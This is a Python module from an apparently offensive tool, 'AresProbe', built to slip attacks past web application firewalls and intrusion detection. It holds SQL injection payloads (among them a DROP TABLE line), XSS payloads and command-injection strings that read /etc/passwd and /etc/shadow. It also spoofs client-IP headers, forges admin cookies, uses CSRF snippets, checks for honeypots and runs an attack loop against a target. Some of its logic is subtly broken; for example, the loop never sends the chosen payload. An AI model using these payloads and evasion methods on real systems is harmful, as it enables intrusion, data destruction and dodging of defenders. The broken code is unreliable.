"""
AresProbe Advanced Evasion Engine
Advanced techniques for bypassing security controls and detection systems
"""

import random
import string
import base64
import urllib.parse
import hashlib
import time
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from .logger import Logger


class EvasionTechnique(Enum):
    """Advanced evasion techniques"""
    USER_AGENT_ROTATION = "user_agent_rotation"
    PROXY_CHAINING = "proxy_chaining"
    REQUEST_FRAGMENTATION = "request_fragmentation"
    TIMING_ATTACKS = "timing_attacks"
    ENCODING_OBFUSCATION = "encoding_obfuscation"
    HEADER_MANIPULATION = "header_manipulation"
    COOKIE_POISONING = "cookie_poisoning"
    SESSION_FIXATION = "session_fixation"
    CSRF_BYPASS = "csrf_bypass"
    WAF_BYPASS = "waf_bypass"
    IDS_EVASION = "ids_evasion"
    HONEYPOT_DETECTION = "honeypot_detection"


@dataclass
class EvasionConfig:
    """Configuration for evasion techniques"""
    user_agent_rotation: bool = True
    proxy_chaining: bool = True
    request_fragmentation: bool = True
    timing_attacks: bool = True
    encoding_obfuscation: bool = True
    header_manipulation: bool = True
    cookie_poisoning: bool = True
    session_fixation: bool = True
    csrf_bypass: bool = True
    waf_bypass: bool = True
    ids_evasion: bool = True
    honeypot_detection: bool = True
    
    # Advanced settings
    max_retries: int = 5
    retry_delay: float = 1.0
    request_timeout: int = 30
    max_redirects: int = 10
    verify_ssl: bool = False


class AdvancedEvasionEngine:
    """Advanced evasion engine for bypassing security controls"""
    
    def __init__(self, config: EvasionConfig, logger: Logger = None):
        self.config = config
        self.logger = logger or Logger()
        self.session = requests.Session()
        self.user_agents = self._load_user_agents()
        self.proxies = self._load_proxies()
        self.encoding_methods = self._load_encoding_methods()
        self.bypass_payloads = self._load_bypass_payloads()
        
        # Setup session with evasion techniques
        self._setup_evasion_session()
    
    def _load_user_agents(self) -> List[str]:
        """Load diverse user agents for rotation"""
        return [
            # Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            
            # Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            
            # Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            
            # Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            
            # Mobile
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            
            # Bots (for testing)
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
        ]
    
    def _load_proxies(self) -> List[Dict[str, str]]:
        """Load proxy servers for chaining"""
        # In a real implementation, you'd load from a proxy list
        return [
            {"http": "http://proxy1.example.com:8080", "https": "https://proxy1.example.com:8080"},
            {"http": "http://proxy2.example.com:8080", "https": "https://proxy2.example.com:8080"},
            {"http": "http://proxy3.example.com:8080", "https": "https://proxy3.example.com:8080"}
        ]
    
    def _load_encoding_methods(self) -> List[str]:
        """Load encoding methods for obfuscation"""
        return [
            'url', 'double_url', 'html', 'unicode', 'hex', 'base64',
            'utf8', 'utf16', 'ascii', 'binary', 'rot13', 'caesar',
            'reverse', 'chunked', 'gzip', 'deflate'
        ]
    
    def _load_bypass_payloads(self) -> Dict[str, List[str]]:
        """Load bypass payloads for different security controls"""
        return {
            'waf_bypass': [
                # SQL Injection bypasses
                "' OR 1=1--",
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' OR 1=1;--",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 GROUP BY 1--",
                
                # XSS bypasses
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                
                # Command Injection bypasses
                "; ls -la",
                "| whoami",
                "& id",
                "` cat /etc/passwd `",
                "$(whoami)",
                "; cat /etc/passwd",
                "| cat /etc/shadow",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            'ids_evasion': [
                # Fragmentation techniques
                "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n",
                "GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                "GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n\r\n",
                
                # Timing attacks
                "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n",
                "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n",
                "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
            ],
            'csrf_bypass': [
                # CSRF token bypasses
                "<form action='http://target.com/action' method='POST'>",
                "<input type='hidden' name='csrf_token' value=''>",
                "<input type='submit' value='Submit'>",
                "</form>",
                
                # SameSite bypass
                "<iframe src='http://target.com/csrf' style='display:none'></iframe>",
                "<img src='http://target.com/csrf' style='display:none'>",
                "<script>fetch('http://target.com/csrf')</script>"
            ]
        }
    
    def _setup_evasion_session(self):
        """Setup session with evasion techniques"""
        # Setup retry strategy
        retry_strategy = Retry(
            total=self.config.max_retries,
            backoff_factor=self.config.retry_delay,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Disable SSL verification for testing
        self.session.verify = self.config.verify_ssl
        
        # Set default headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def rotate_user_agent(self):
        """Rotate user agent for evasion"""
        if self.config.user_agent_rotation:
            user_agent = random.choice(self.user_agents)
            self.session.headers.update({'User-Agent': user_agent})
            self.logger.debug(f"[*] Rotated User-Agent: {user_agent[:50]}...")
    
    def apply_proxy_chaining(self):
        """Apply proxy chaining for evasion"""
        if self.config.proxy_chaining and self.proxies:
            proxy = random.choice(self.proxies)
            self.session.proxies.update(proxy)
            self.logger.debug(f"[*] Applied proxy: {proxy}")
    
    def fragment_request(self, url: str, method: str = "GET", **kwargs) -> List[requests.Request]:
        """Fragment request into multiple parts for evasion"""
        if not self.config.request_fragmentation:
            return [requests.Request(method, url, **kwargs)]
        
        fragmented_requests = []
        
        # Fragment headers
        headers = kwargs.get('headers', {})
        if headers:
            for key, value in headers.items():
                req = requests.Request(method, url, headers={key: value})
                fragmented_requests.append(req)
        
        # Fragment data
        data = kwargs.get('data', {})
        if data:
            for key, value in data.items():
                req = requests.Request(method, url, data={key: value})
                fragmented_requests.append(req)
        
        return fragmented_requests if fragmented_requests else [requests.Request(method, url, **kwargs)]
    
    def apply_timing_attack(self, delay_range: tuple = (0.1, 2.0)):
        """Apply timing attack for evasion"""
        if self.config.timing_attacks:
            delay = random.uniform(*delay_range)
            time.sleep(delay)
            self.logger.debug(f"[*] Applied timing delay: {delay:.2f}s")
    
    def obfuscate_payload(self, payload: str, method: str = None) -> str:
        """Obfuscate payload using various encoding methods"""
        if not self.config.encoding_obfuscation:
            return payload
        
        if not method:
            method = random.choice(self.encoding_methods)
        
        try:
            if method == 'url':
                return urllib.parse.quote(payload)
            elif method == 'double_url':
                return urllib.parse.quote(urllib.parse.quote(payload))
            elif method == 'html':
                return payload.replace('<', '&lt;').replace('>', '&gt;')
            elif method == 'unicode':
                return ''.join(f'\\u{ord(c):04x}' for c in payload)
            elif method == 'hex':
                return ''.join(f'\\x{ord(c):02x}' for c in payload)
            elif method == 'base64':
                return base64.b64encode(payload.encode()).decode()
            elif method == 'rot13':
                return payload.translate(str.maketrans(
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
                ))
            elif method == 'caesar':
                shift = random.randint(1, 25)
                return ''.join(chr((ord(c) - 97 + shift) % 26 + 97) if c.islower() else c for c in payload)
            elif method == 'reverse':
                return payload[::-1]
            elif method == 'chunked':
                # Simulate chunked encoding
                return f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n"
            else:
                return payload
        except Exception as e:
            self.logger.debug(f"[-] Error obfuscating payload: {e}")
            return payload
    
    def manipulate_headers(self, headers: Dict[str, str] = None) -> Dict[str, str]:
        """Manipulate headers for evasion"""
        if not self.config.header_manipulation:
            return headers or {}
        
        evasion_headers = {
            'X-Forwarded-For': self._generate_fake_ip(),
            'X-Real-IP': self._generate_fake_ip(),
            'X-Originating-IP': self._generate_fake_ip(),
            'X-Remote-IP': self._generate_fake_ip(),
            'X-Remote-Addr': self._generate_fake_ip(),
            'X-Client-IP': self._generate_fake_ip(),
            'X-Host': 'target.com',
            'X-Forwarded-Host': 'target.com',
            'X-Forwarded-Server': 'target.com',
            'X-HTTP-Host-Override': 'target.com',
            'X-Original-URL': '/',
            'X-Rewrite-URL': '/',
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Scheme': 'https',
            'X-Forwarded-Port': '443',
            'X-Forwarded-Host': 'target.com:443',
            'X-Forwarded-Server': 'target.com',
            'X-Forwarded-For': self._generate_fake_ip(),
            'X-Real-IP': self._generate_fake_ip(),
            'X-Originating-IP': self._generate_fake_ip(),
            'X-Remote-IP': self._generate_fake_ip(),
            'X-Remote-Addr': self._generate_fake_ip(),
            'X-Client-IP': self._generate_fake_ip()
        }
        
        if headers:
            evasion_headers.update(headers)
        
        return evasion_headers
    
    def _generate_fake_ip(self) -> str:
        """Generate fake IP address for header manipulation"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def poison_cookies(self, cookies: Dict[str, str] = None) -> Dict[str, str]:
        """Poison cookies for evasion"""
        if not self.config.cookie_poisoning:
            return cookies or {}
        
        poison_cookies = {
            'sessionid': self._generate_session_id(),
            'csrftoken': self._generate_csrf_token(),
            'auth_token': self._generate_auth_token(),
            'user_id': str(random.randint(1, 10000)),
            'role': 'admin',
            'permissions': 'all',
            'last_login': str(int(time.time())),
            'ip_address': self._generate_fake_ip(),
            'user_agent': random.choice(self.user_agents),
            'referer': 'https://google.com'
        }
        
        if cookies:
            poison_cookies.update(cookies)
        
        return poison_cookies
    
    def _generate_session_id(self) -> str:
        """Generate fake session ID"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def _generate_csrf_token(self) -> str:
        """Generate fake CSRF token"""
        return base64.b64encode(''.join(random.choices(string.ascii_letters + string.digits, k=32)).encode()).decode()
    
    def _generate_auth_token(self) -> str:
        """Generate fake auth token"""
        return hashlib.sha256(''.join(random.choices(string.ascii_letters + string.digits, k=64)).encode()).hexdigest()
    
    def detect_honeypots(self, response: requests.Response) -> bool:
        """Detect if response is from a honeypot"""
        if not self.config.honeypot_detection:
            return False
        
        honeypot_indicators = [
            'honeypot', 'honeynet', 'sandbox', 'trap',
            'monitoring', 'detection', 'security',
            'fake', 'dummy', 'test', 'demo'
        ]
        
        response_text = response.text.lower()
        response_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        # Check response content
        for indicator in honeypot_indicators:
            if indicator in response_text or any(indicator in v for v in response_headers.values()):
                self.logger.warning(f"[!] Possible honeypot detected: {indicator}")
                return True
        
        # Check response characteristics
        if len(response.text) < 100:  # Very short response
            self.logger.warning("[!] Suspiciously short response - possible honeypot")
            return True
        
        if response.status_code in [404, 403, 500]:  # Common honeypot status codes
            self.logger.warning(f"[!] Suspicious status code: {response.status_code}")
            return True
        
        return False
    
    def bypass_waf(self, payload: str) -> List[str]:
        """Generate WAF bypass payloads"""
        if not self.config.waf_bypass:
            return [payload]
        
        bypass_payloads = []
        
        # Add original payload
        bypass_payloads.append(payload)
        
        # Add WAF bypass techniques
        for technique in self.bypass_payloads['waf_bypass']:
            if technique in payload.lower():
                # Apply various bypass techniques
                bypass_payloads.append(self._apply_waf_bypass(payload, technique))
        
        return list(set(bypass_payloads))  # Remove duplicates
    
    def _apply_waf_bypass(self, payload: str, technique: str) -> str:
        """Apply specific WAF bypass technique"""
        if 'union' in technique.lower():
            return payload.replace('UNION', 'UNI/*ON*/').replace('SELECT', 'SEL/*ECT*/')
        elif 'script' in technique.lower():
            return payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>')
        elif 'or' in technique.lower():
            return payload.replace('OR', 'O/*R*/').replace('AND', 'A/*ND*/')
        else:
            return payload
    
    def execute_evasion_attack(self, target: str, payload: str, method: str = "GET") -> Dict[str, Any]:
        """Execute attack with full evasion techniques"""
        results = {
            'target': target,
            'payload': payload,
            'method': method,
            'evasion_techniques': [],
            'responses': [],
            'honeypot_detected': False,
            'success': False
        }
        
        try:
            self.logger.info(f"[*] Executing evasion attack on {target}")
            
            # Apply evasion techniques
            self.rotate_user_agent()
            self.apply_proxy_chaining()
            self.apply_timing_attack()
            
            # Obfuscate payload
            obfuscated_payloads = [self.obfuscate_payload(payload) for _ in range(3)]
            
            # Generate bypass payloads
            bypass_payloads = self.bypass_waf(payload)
            
            # Combine all payloads
            all_payloads = [payload] + obfuscated_payloads + bypass_payloads
            
            # Execute attacks
            for i, test_payload in enumerate(all_payloads[:10]):  # Limit to 10 payloads
                try:
                    # Apply header manipulation
                    headers = self.manipulate_headers()
                    
                    # Apply cookie poisoning
                    cookies = self.poison_cookies()
                    
                    # Send request
                    response = self.session.request(
                        method=method,
                        url=target,
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.request_timeout,
                        allow_redirects=True
                    )
                    
                    # Check for honeypot
                    if self.detect_honeypots(response):
                        results['honeypot_detected'] = True
                        continue
                    
                    # Store response
                    results['responses'].append({
                        'payload': test_payload,
                        'status_code': response.status_code,
                        'headers': dict(response.headers),
                        'content_length': len(response.content),
                        'response_time': response.elapsed.total_seconds()
                    })
                    
                    # Check for success indicators
                    if self._check_success_indicators(response, test_payload):
                        results['success'] = True
                        results['evasion_techniques'].append(f"Payload {i+1} successful")
                    
                except Exception as e:
                    self.logger.debug(f"[-] Error with payload {i+1}: {e}")
                    continue
            
            self.logger.success(f"[+] Evasion attack completed: {len(results['responses'])} requests sent")
            
        except Exception as e:
            self.logger.error(f"[-] Evasion attack failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def _check_success_indicators(self, response: requests.Response, payload: str) -> bool:
        """Check if response indicates successful attack"""
        success_indicators = [
            'error in your sql syntax',
            'mysql_fetch_array',
            'ora-',
            'microsoft.*odbc.*sql server',
            'postgresql.*error',
            'warning.*mysql_',
            'valid mysql result',
            'root:',
            'admin:',
            'user:',
            'database:',
            'table_name',
            'column_name'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        return False
